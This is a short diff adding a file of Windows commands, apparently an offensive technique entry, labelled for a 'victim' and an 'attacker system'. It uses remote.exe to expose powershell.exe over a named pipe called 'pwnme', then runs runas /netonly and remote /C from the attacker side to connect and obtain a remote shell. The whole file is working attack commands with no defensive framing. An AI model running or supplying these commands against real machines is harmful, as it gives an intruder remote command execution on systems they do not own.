@@ -1,0 +1,7 @@
+# Command to run on the victim
+# This will establish a PowerShell listener over the "pwnme" named pipe
+remote /S "powershell.exe" pwnme
+
+# Commands to run on an attacker system - if remote.exe is desired on the client (versus developing your own SMB pipe client)
+runas /netonly /user:[Domain|Hostname\Username] "cmd"
+remote /C [Hostname\IP] "pwnme"
